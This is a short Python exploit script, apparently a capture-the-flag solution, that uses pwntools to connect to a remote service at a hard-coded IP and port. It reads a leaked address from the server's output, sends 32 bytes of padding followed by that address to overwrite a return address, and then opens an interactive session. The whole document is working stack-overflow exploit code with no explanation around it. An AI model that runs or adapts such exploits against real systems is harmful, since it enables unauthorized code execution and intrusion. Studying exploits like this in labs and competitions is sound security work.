import re
from pwn import *

io = remote("35.200.120.35", 9003)

_ = io.recv(512)
address = io.recv(512).decode().split("\n")[9][13:26] + "286"
print(address)

payload = b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
payload += bytes.fromhex(address)[::-1] + b"\n"
io.send(payload)

io.interactive()